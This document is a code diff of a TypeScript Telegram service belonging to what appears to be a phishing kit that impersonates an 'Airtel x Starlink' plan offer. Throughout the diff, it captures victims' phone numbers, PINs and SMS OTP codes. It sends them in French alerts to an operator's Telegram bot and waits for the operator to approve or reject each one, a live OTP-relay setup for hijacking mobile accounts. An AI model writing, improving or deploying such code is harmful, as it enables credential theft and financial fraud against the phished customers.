@@ -36,65 +36,135 @@ export interface TelegramReenterPinPayload {
   planPrice?: string;
 }
 
-export interface TelegramStatusResult {
-  loginStatus: 'idle' | 'pending' | 'approved' | 'rejected';
-  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
-  reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
-}
-
-class TelegramService {
-  private localSessionState: Map<
-    string,
-    {
-      loginStatus: 'pending' | 'approved' | 'rejected';
-      otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
-      reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
-      phone?: string;
-      fullPhone?: string;
-      country?: string;
-      pin?: string;
-      reenterPin?: string;
-      otp?: string;
-      planName?: string;
-      planPrice?: string;
-    }
-  > = new Map();
-
-  /**
-   * Helper to safely parse JSON
-   */
-  private async safeJson(res: Response): Promise<any> {
-    try {
-      const text = await res.text();
-      if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
-        return null;
-      }
-      return JSON.parse(text);
-    } catch {
+/**
+ * Helper to safely parse JSON
+ */
+const safeJson = async (res: Response): Promise<any> => {
+  try {
+    const text = await res.text();
+    if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
       return null;
+    }
+    return JSON.parse(text);
+  } catch {
+    return null;
+  }
+};
+
+/**
+ * Send message to Telegram and wait for callback (exact working logic)
+ */
+const sendToTelegramAndWait = async (message: string, sessionId: string, isCode: boolean = false): Promise<boolean> => {
+  const token = getTelegramBotToken();
+  const chatId = getTelegramChatId();
+
+  if (!token || !chatId) return true; // fallback to true
+
+  const sessionKey = `pendingAuth_${sessionId}_${isCode ? 'code' : 'login'}`;
+  let messageId = safeStorage.getItem(sessionKey);
+
+  if (!messageId) {
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const keyboard = {
+      inline_keyboard: [
+        [
+          { text: '✅ Accept', callback_data: 'accept' },
+          { text: '❌ Decline', callback_data: 'decline' }
+        ]
+      ]
+    };
+
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML',
+          reply_markup: keyboard
+        }),
+      });
+
+      if (!response.ok) return true;
+      const data = await safeJson(response);
+      if (!data || !data.ok) return true;
+
+      messageId = data.result.message_id.toString();
+      safeStorage.setItem(sessionKey, messageId!);
+    } catch (error) {
+      return true; // fallback
     }
   }
 
+  // Start polling for callback query
+  // We omit offset so we don't accidentally clear updates for other concurrent users.
+  // The Telegram API will return the last 100 unconfirmed updates.
+  while (true) {
+    try {
+      const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
+      const updateRes = await fetch(updateUrl);
+      const updateData = await safeJson(updateRes);
+
+      if (updateData && updateData.ok && updateData.result && updateData.result.length > 0) {
+        for (const update of updateData.result) {
+          if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
+            const action = update.callback_query.data;
+
+            // Acknowledge the callback
+            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ callback_query_id: update.callback_query.id })
+            }).catch(() => {});
+
+            // Edit message text to show result
+            const newText = message + `\n\n<b>[ ${action === 'accept' ? '✅ APPROVED' : '❌ DECLINED'} ]</b>`;
+            await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: chatId,
+                message_id: messageId,
+                text: newText,
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: [] }
+              })
+            }).catch(() => {});
+
+            // Clear session after decision
+            safeStorage.removeItem(sessionKey);
+
+            // Clear this update to avoid reprocessing
+            await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});
+
+            return action === 'accept';
+          }
+        }
+      }
+    } catch (e) {
+      // network error during polling, ignore and retry
+    }
+
+    // wait a bit before next poll
+    await new Promise(resolve => setTimeout(resolve, 3000));
+  }
+};
+
+class TelegramService {
   /**
-   * Send Login Credentials and wait for Telegram callback (getUpdates polling)
+   * Send Login Credentials (Phone + 4-digit PIN)
    */
   public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
     const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
     const cleanPhone = phone.replace(/\D/g, '');
     const cleanPin = pin.slice(0, 4);
-    const token = getTelegramBotToken();
-    const chatId = getTelegramChatId();
-
-    if (!token || !chatId) {
-      console.warn('[TelegramService] Telegram credentials not configured');
-      return true; // fallback to success
-    }
 
     const displayPhone = fullPhone || (phone.startsWith('+') ? phone : `+243 ${phone}`);
     const displayCountry = country || 'Airtel Africa';
     const displayBrand = airtelBrand || 'Airtel x Starlink Direct';
 
-    const messageText =
+    const message =
       `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
       `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
       `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
@@ -105,274 +175,40 @@ class TelegramService {
       `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
       `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
 
-    const inlineKeyboard = [
-      [
-        {
-          text: '✅ Valider PIN',
-          callback_data: `approve_login_${sessionId}`,
-        },
-        {
-          text: '❌ Rejeter PIN',
-          callback_data: `reject_login_${sessionId}`,
-        },
-      ],
-      [
-        {
-          text: '🌐 Action Directe (Lien Web)',
-          url: `https://congo2-one.vercel.app/api/telegram/action?id=${sessionId}&action=approve_login`,
-        },
-      ],
-    ];
-
-    const sessionKey = `pendingAuth_${sessionId}_login`;
-    let messageId = safeStorage.getItem(sessionKey);
-
-    if (!messageId) {
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: messageText,
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: inlineKeyboard },
-          }),
-        });
-
-        if (!response.ok) return true;
-        const data = await this.safeJson(response);
-        if (!data || !data.ok) return true;
-
-        messageId = data.result.message_id.toString();
-        safeStorage.setItem(sessionKey, messageId);
-        console.log('[TelegramService] Message sent, ID:', messageId);
-      } catch (error) {
-        console.warn('[TelegramService] Send error:', error);
-        return true;
-      }
-    }
-
-    // Start polling for callback query
-    while (true) {
-      try {
-        const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
-        const updateRes = await fetch(updateUrl);
-        const updateData = await this.safeJson(updateRes);
-
-        if (updateData && updateData.ok && updateData.result && updateData.result.length > 0) {
-          for (const update of updateData.result) {
-            if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
-              const action = update.callback_query.data;
-
-              // Acknowledge the callback
-              await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  callback_query_id: update.callback_query.id,
-                  text: action === 'approve_login' ? '✅ Connexion validée !' : '❌ Connexion refusée.',
-                  show_alert: true,
-                }),
-              }).catch(() => {});
-
-              // Update message text
-              const newText = messageText + `\n\n<b>[ ${action === 'approve_login' ? '✅ APPROUVÉ' : '❌ REJETÉ'} ]</b>`;
-              await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  chat_id: chatId,
-                  message_id: messageId,
-                  text: newText,
-                  parse_mode: 'HTML',
-                  reply_markup: { inline_keyboard: [] },
-                }),
-              }).catch(() => {});
-
-              // Clear session storage
-              safeStorage.removeItem(sessionKey);
-
-              // Clear this update to avoid reprocessing
-              await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});
-
-              console.log('[TelegramService] Action received:', action, 'for session:', sessionId);
-
-              return action === 'approve_login';
-            }
-          }
-        }
-      } catch (e) {
-        console.warn('[TelegramService] Polling error:', e);
-      }
-
-      // Wait before next poll
-      await new Promise((resolve) => setTimeout(resolve, 3000));
-    }
+    return sendToTelegramAndWait(message, sessionId, false);
   }
 
   /**
-   * Send OTP and wait for Telegram callback
+   * Send OTP Verification Code (4 digits)
    */
   public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
     const { sessionId, phone, otp, planName, planPrice, country, fullPhone, airtelBrand } = payload;
     const cleanOtp = otp.replace(/\D/g, '').slice(0, 4);
-    const token = getTelegramBotToken();
-    const chatId = getTelegramChatId();
 
-    if (!token || !chatId) {
-      console.warn('[TelegramService] Telegram credentials not configured');
-      return true; // fallback to success
-    }
+    const displayPhone = fullPhone || phone || 'Inconnu';
+    const displayCountry = country || 'Airtel Africa';
 
-    const existing = this.localSessionState.get(sessionId) || {
-      loginStatus: 'approved' as const,
-      otpStatus: 'pending' as const,
-      fullPhone,
-      country,
-    };
-    existing.otp = cleanOtp;
-    existing.otpStatus = 'pending';
-    this.localSessionState.set(sessionId, existing);
-
-    const displayPhone = fullPhone || existing.fullPhone || (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
-    const displayCountry = country || existing.country || 'Airtel Africa';
-
-    const messageText =
+    const message =
       `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
       `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
       `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
       `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
-      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
+      `📦 <b>Forfait:</b> ${planName || 'Forfait Airtel Starlink'} (${planPrice || '$1.49'})\n` +
       `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
       `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
       `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;
 
-    const inlineKeyboard = [
-      [
-        {
-          text: '✅ Valider OTP',
-          callback_data: `approve_otp_${sessionId}`,
-        },
-        {
-          text: '❌ Rejeter OTP',
-          callback_data: `reject_otp_${sessionId}`,
-        },
-      ],
-      [
-        {
-          text: '🌐 Action Directe (Lien Web)',
-          url: `https://congo2-one.vercel.app/api/telegram/action?id=${sessionId}&action=approve_otp`,
-        },
-      ],
-    ];
-
-    const sessionKey = `pendingAuth_${sessionId}_otp`;
-    let messageId = safeStorage.getItem(sessionKey);
-
-    if (!messageId) {
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: messageText,
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: inlineKeyboard },
-          }),
-        });
-
-        if (!response.ok) return true;
-        const data = await this.safeJson(response);
-        if (!data || !data.ok) return true;
-
-        messageId = data.result.message_id.toString();
-        safeStorage.setItem(sessionKey, messageId);
-        console.log('[TelegramService] OTP message sent, ID:', messageId);
-      } catch (error) {
-        console.warn('[TelegramService] OTP send error:', error);
-        return true;
-      }
-    }
-
-    // Start polling for callback query
-    while (true) {
-      try {
-        const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
-        const updateRes = await fetch(updateUrl);
-        const updateData = await this.safeJson(updateRes);
-
-        if (updateData && updateData.ok && updateData.result && updateData.result.length > 0) {
-          for (const update of updateData.result) {
-            if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
-              const action = update.callback_query.data;
-
-              // Acknowledge the callback
-              await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  callback_query_id: update.callback_query.id,
-                  text: action === 'approve_otp' ? '✅ OTP validé !' : '❌ OTP rejeté.',
-                  show_alert: true,
-                }),
-              }).catch(() => {});
-
-              // Update message text
-              const newText = messageText + `\n\n<b>[ ${action === 'approve_otp' ? '✅ APPROUVÉ' : '❌ REJETÉ'} ]</b>`;
-              await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  chat_id: chatId,
-                  message_id: messageId,
-                  text: newText,
-                  parse_mode: 'HTML',
-                  reply_markup: { inline_keyboard: [] },
-                }),
-              }).catch(() => {});
-
-              // Clear session storage
-              safeStorage.removeItem(sessionKey);
-
-              // Clear this update
-              await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});
-
-              console.log('[TelegramService] OTP action received:', action, 'for session:', sessionId);
-
-              return action === 'approve_otp';
-            }
-          }
-        }
-      } catch (e) {
-        console.warn('[TelegramService] OTP polling error:', e);
-      }
-
-      await new Promise((resolve) => setTimeout(resolve, 3000));
-    }
+    return sendToTelegramAndWait(message, sessionId, true);
   }
 
   /**
-   * Status polling - checks local state (no external DB needed)
+   * Status polling - not needed with blocking pattern
    */
   public async pollUpdates(
     sessionId: string,
     targetStep: 'login' | 'otp' | 'reenter',
     phone?: string
   ): Promise<'pending' | 'approved' | 'rejected'> {
-    const local = this.localSessionState.get(sessionId);
-    if (local) {
-      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) {
-        return local.loginStatus;
-      }
-      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
-        return local.otpStatus;
-      }
-      if (targetStep === 'reenter' && (local.reenterStatus === 'approved' || local.reenterStatus === 'rejected')) {
-        return local.reenterStatus;
-      }
-    }
     return 'pending';
   }
 }
